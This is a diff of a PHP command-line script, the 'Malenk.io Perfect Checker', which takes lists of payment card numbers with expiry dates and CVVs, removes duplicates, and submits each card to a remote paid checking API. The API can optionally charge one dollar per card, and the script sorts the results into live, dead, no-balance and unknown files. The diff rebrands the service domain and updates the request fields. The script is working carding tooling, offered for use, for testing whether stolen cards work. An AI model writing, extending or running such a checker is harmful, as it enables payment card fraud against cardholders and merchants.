@@ -2,7 +2,7 @@
 /**
  * Malenk.io Perfect Checker
  * @version : 1.0
- * @author  : Malenk.io
+ * @author  : Malenk.pro
  * Have two type_check. charge 1$ (USD) and no charge version!
  * Input charge if you just want charge. Input random for random (charge or not)
  * Input anything/null if you just want non-charge type_check
@@ -12,20 +12,8 @@
 date_default_timezone_set("Asia/Jakarta");
 $colors = new \Colors();
 if(!file_exists("config.json")) {
-    file_put_contents("config.json", json_encode(['key' => 'YOUR KEY', 'type_check' => 'charge', 'result_dir' => 'RESULT']));
+    file_put_contents("config.json", json_encode(['userkey' => 'MASUKAN KEY ANDA DISINI', 'type_check' => 'MASUKAN TYPE CHECK [nocharge or gate1]', 'result_dir' => 'RESULT']));
 }
-
-// Getting latest Versions
-$version = "1.0";
-$get = file_get_contents("https://malenk.co/api/");
-echo "Latest Version : ".$colors->getColoredString(json_decode($get,1)['latest_version'], "white", "green").PHP_EOL;
-echo "Your Version   : ".$colors->getColoredString($version, "white", "red").PHP_EOL;
-if($version == json_decode($get,1)['latest_version']) {
-    echo "Your version is same!".PHP_EOL.PHP_EOL;
-} else {
-    die("You need to update your script.");
-}
-
 
 if(!file_exists("alerts.txt")) {
     echo "Hello! Welcome to Malenk.io Checker! Please Update your config before run this source code!".PHP_EOL;
@@ -45,15 +33,15 @@ if(!is_dir($readConfig['result_dir'])) {
 
 $i=0;
 do {
-    $isValidKeys = curl("http://malenk.co/api/?version=1.0", json_encode(['type' => 'validate_key', 'key' => $readConfig['key']]));
+    $isValidKeys = curl("https://malenk.pro/api/?version=1.0", json_encode(['type' => 'validate_userkey', 'data' => ['userkey' => $readConfig['userkey'] ]]));
     if(isJson($isValidKeys)) {
-        if(json_decode($isValidKeys, true)['success'] == true) {
+        if(json_decode($isValidKeys, true)['error'] == false) {
             echo "[-] Key is ".$colors->getColoredString("VALID").PHP_EOL;
-            echo "[-] Credit : ".$colors->getColoredString(number_format(json_decode($isValidKeys,1)['credit']), "white", "green").PHP_EOL.PHP_EOL;
+            echo "[-] Credit : ".$colors->getColoredString(number_format(json_decode($isValidKeys,1)['credit']).'￠', "white", "green").PHP_EOL;
             break;
         } else {
             echo "[!] ".$colors->getColoredString(json_decode($isValidKeys,1)['message'], "cyan", "red").PHP_EOL;
-            break;
+            exit;
         }
     } else {
        echo "[!] ".$colors->getColoredString("Failed connect to server, contact admin if you dont know this error.", "red").PHP_EOL;
@@ -85,7 +73,6 @@ if(strtolower($deleteDuplicate) == 'y') {
     foreach(explode("\n", str_replace("\r", "", $old_content)) as $content) {
         @list($ccnum, $ccmonth, $ccy, $ccv) = explode("|", trim($content));
         if(@!preg_match("/".trim($ccnum)."/", file_get_contents($newPath."_no_duplicate.txt"))) {
-            //echo $ccnum." => Writed\n";
             file_put_contents($newPath."_no_duplicate.txt", $ccnum."|".$ccmonth."|".$ccy."|".$ccv.PHP_EOL, FILE_APPEND);
         }
         $o++;
@@ -101,26 +88,24 @@ $content = explode("\n", trim(file_get_contents($newPath)));
 $lineNow = 1;
 foreach($content as $format) {
     checking:
-    $check = curl("http://malenk.co/api/?version=1.0", json_encode(['key' => trim($readConfig['key']), 'type' => $readConfig['type_check'], 'format' => trim($format)]));
+    $check = curl("https://malenk.pro/api/?version=1.0", json_encode(['type' => 'check','data' => ['userkey' => $readConfig['userkey'], 'type_check' => $readConfig['type_check'], 'cclist' => trim($format)]]));
     if(isJson($check)) {
         if(json_decode($check,1)['status'] == "LIVE") {
-            echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".json_decode($check,1)['bin']." [".$colors->getColoredString("LIVE", "white", "green")."] [CREDIT : ".$colors->getColoredString(json_decode($check,1)['account_credit'], "white", "green")."] [Check Type : ".json_decode($check,1)['check_type']."]".PHP_EOL;
-            file_put_contents($readConfig['result_dir']."/live.txt", trim($format)." | ".json_decode($check,1)['bin']."".PHP_EOL, FILE_APPEND);
+            echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".json_decode($check,1)['bin_info']." [".$colors->getColoredString("LIVE", "white", "green")."] [CREDIT : ".$colors->getColoredString(json_decode($check,1)['credit'], "white", "green")."] [Check Type : ".json_decode($check,1)['check_type']."]".PHP_EOL;
+            file_put_contents($readConfig['result_dir']."/liveajg.txt", trim($format)." | ".json_decode($check,1)['bin_info']."".PHP_EOL, FILE_APPEND);
+			file_put_contents($readConfig['result_dir']."/liveeee.txt", trim($format)."".PHP_EOL, FILE_APPEND);
             sleep(3);
         } else if(json_decode($check,1)['status'] == "UNKNOWN") {
             $addMsg = "";
             if(isset(json_decode($check,1)['message'])) {
                 $addMsg = "(".json_decode($check,1)['message'].")";
-                
             }
-            if(preg_match("/An error occurred while processing your card/", json_decode($check,1)['message']) OR preg_match("/Not Supported/", json_decode($check,1)['message_api']) OR json_decode($check,1)['decline_code'] == 'currency_not_supported' OR json_decode($check,1)['decline_code'] == '') {
+            if(preg_match("/An error occurred while processing your card/", json_decode($check,1)['message'])) {
                 echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".$colors->getColoredString("UNKNOWN", "yellow")." Continue to next card! ".$addMsg.PHP_EOL;
                 file_put_contents($readConfig['result_dir']."/unknown.txt", $format.PHP_EOL, FILE_APPEND);
-                
             } else if(@json_decode($check,1)['try_recheck'] == true) {
-                #file_put_contents("err.log", $check.PHP_EOL, FILE_APPEND);
                 echo "== ".trim($format)." => ".$colors->getColoredString("UNKNOWN", "yellow")." Wait for re-check from system. ".$addMsg.PHP_EOL;
-               sleep(3);
+                sleep(3);
                 goto checking;
             } else {
                 file_put_contents("err.log", $check.PHP_EOL, FILE_APPEND);
@@ -128,16 +113,21 @@ foreach($content as $format) {
                 sleep(15);
                 goto checking;
             }
+        } else if (json_decode($check,1)['status'] == "UNCHECK") {
+            file_put_contents("uncheck.log", $check.PHP_EOL, FILE_APPEND);
+            echo "== ".trim($format)." => ".$colors->getColoredString("UNCHECK", "yellow")." ".$colors->getColoredString(json_decode($check,1)['message'], "red").PHP_EOL;
         } else {
             if(@json_decode($check, 1)['decline_code'] == 'transaction_not_allowed') {
                 file_put_contents($readConfig['result_dir']."/unknown_not_supported.txt", trim($format).PHP_EOL, FILE_APPEND);
+            } else if(json_decode($check,1)['decline_code'] == 'insufficient_funds') {
+                file_put_contents($readConfig['result_dir']."/die_no_balance.txt", trim($format).PHP_EOL, FILE_APPEND);
             } else if(json_decode($check,1)['message'] == "Invalid object") {
                 goto checking;
             } else {
                 file_put_contents($readConfig['result_dir']."/die.txt", trim($format).PHP_EOL, FILE_APPEND);
             }
-            $declineCode = json_decode($check,1)['decline_code'] !== null ? "(".$colors->getColoredString(json_decode($check,1)['decline_code'], "white", "red").")" : '';
-            echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".$colors->getColoredString(json_decode($check,1)['status'], "white", "red")." | ".$colors->getColoredString(json_decode($check,1)['message'], "red")." ".$declineCode." [CREDIT : ".$colors->getColoredString(json_decode($check,1)['account_credit'], "white", "green")."] [Check Type : ".json_decode($check,1)['check_type']."]".PHP_EOL;
+            $declineCode = json_decode($check,1)['decline_code'] !== null ? "(".$colors->getColoredString(json_decode($check,1)['decline_code'], "white", "red").")" : ''; 
+            echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".$colors->getColoredString(json_decode($check,1)['status'], "white", "red")." | ".$colors->getColoredString(json_decode($check,1)['message'], "red")." ".$declineCode." [CREDIT : ".$colors->getColoredString(json_decode($check,1)['credit'], "white", "green")."] [Check Type : ".json_decode($check,1)['check_type']."]".PHP_EOL;
         }
     } else {
         #file_put_contents("err.log", $check.PHP_EOL, FILE_APPEND);
@@ -149,7 +139,7 @@ foreach($content as $format) {
     $lineNow++;
 }
 
-echo PHP_EOL.PHP_EOL."Checking Done! Powered by Malenk.io - ".$colors->getColoredString("Perfect Checker", "green")." Site With Accuracy 100%!";
+echo PHP_EOL.PHP_EOL."Checking Done! Powered by Malenk.pro - ".$colors->getColoredString("Perfect Checker", "green")." Site With Accuracy 100%!";
 
 function input($text) {
     echo $text.": ";
@@ -180,64 +170,64 @@ function curl($url, $body=false) {
 
 class Colors {
   private $foreground_colors = array();
-    private $background_colors = array();
+	private $background_colors = array();
 
-    public function __construct() {
-        // Set up shell colors
-        $this->foreground_colors['black'] = '0;30';
-        $this->foreground_colors['dark_gray'] = '1;30';
-        $this->foreground_colors['blue'] = '0;34';
-        $this->foreground_colors['light_blue'] = '1;34';
-        $this->foreground_colors['green'] = '0;32';
-        $this->foreground_colors['light_green'] = '1;32';
-        $this->foreground_colors['cyan'] = '0;36';
-        $this->foreground_colors['light_cyan'] = '1;36';
-        $this->foreground_colors['red'] = '0;31';
-        $this->foreground_colors['light_red'] = '1;31';
-        $this->foreground_colors['purple'] = '0;35';
-        $this->foreground_colors['light_purple'] = '1;35';
-        $this->foreground_colors['brown'] = '0;33';
-        $this->foreground_colors['yellow'] = '1;33';
-        $this->foreground_colors['light_gray'] = '0;37';
-        $this->foreground_colors['white'] = '1;37';
+	public function __construct() {
+		// Set up shell colors
+		$this->foreground_colors['black'] = '0;30';
+		$this->foreground_colors['dark_gray'] = '1;30';
+		$this->foreground_colors['blue'] = '0;34';
+		$this->foreground_colors['light_blue'] = '1;34';
+		$this->foreground_colors['green'] = '0;32';
+		$this->foreground_colors['light_green'] = '1;32';
+		$this->foreground_colors['cyan'] = '0;36';
+		$this->foreground_colors['light_cyan'] = '1;36';
+		$this->foreground_colors['red'] = '0;31';
+		$this->foreground_colors['light_red'] = '1;31';
+		$this->foreground_colors['purple'] = '0;35';
+		$this->foreground_colors['light_purple'] = '1;35';
+		$this->foreground_colors['brown'] = '0;33';
+		$this->foreground_colors['yellow'] = '1;33';
+		$this->foreground_colors['light_gray'] = '0;37';
+		$this->foreground_colors['white'] = '1;37';
 
-        $this->background_colors['black'] = '40';
-        $this->background_colors['red'] = '41';
-        $this->background_colors['green'] = '42';
-        $this->background_colors['yellow'] = '43';
-        $this->background_colors['blue'] = '44';
-        $this->background_colors['magenta'] = '45';
-        $this->background_colors['cyan'] = '46';
-        $this->background_colors['light_gray'] = '47';
-    }
+		$this->background_colors['black'] = '40';
+		$this->background_colors['red'] = '41';
+		$this->background_colors['green'] = '42';
+		$this->background_colors['yellow'] = '43';
+		$this->background_colors['blue'] = '44';
+		$this->background_colors['magenta'] = '45';
+		$this->background_colors['cyan'] = '46';
+		$this->background_colors['light_gray'] = '47';
+	}
 
-    // Returns colored string
-    public function getColoredString($string, $foreground_color = null, $background_color = null) {
-        $colored_string = "";
+	// Returns colored string
+	public function getColoredString($string, $foreground_color = null, $background_color = null) {
+		$colored_string = "";
 
-        // Check if given foreground color found
-        if (isset($this->foreground_colors[$foreground_color])) {
-            $colored_string .= "\033[" . $this->foreground_colors[$foreground_color] . "m";
-        }
-        // Check if given background color found
-        if (isset($this->background_colors[$background_color])) {
-            $colored_string .= "\033[" . $this->background_colors[$background_color] . "m";
-        }
+		// Check if given foreground color found
+		if (isset($this->foreground_colors[$foreground_color])) {
+			$colored_string .= "\033[" . $this->foreground_colors[$foreground_color] . "m";
+		}
+		// Check if given background color found
+		if (isset($this->background_colors[$background_color])) {
+			$colored_string .= "\033[" . $this->background_colors[$background_color] . "m";
+		}
 
-        // Add string and end coloring
-        $colored_string .=  $string . "\033[0m";
+		// Add string and end coloring
+		$colored_string .=  $string . "\033[0m";
 
-        return $colored_string;
-    }
+		return $colored_string;
+	}
 
-    // Returns all foreground color names
-    public function getForegroundColors() {
-        return array_keys($this->foreground_colors);
-    }
+	// Returns all foreground color names
+	public function getForegroundColors() {
+		return array_keys($this->foreground_colors);
+	}
 
-    // Returns all background color names
-    public function getBackgroundColors() {
-        return array_keys($this->background_colors);
-    }
+	// Returns all background color names
+	public function getBackgroundColors() {
+		return array_keys($this->background_colors);
+	}
 }
 ?>
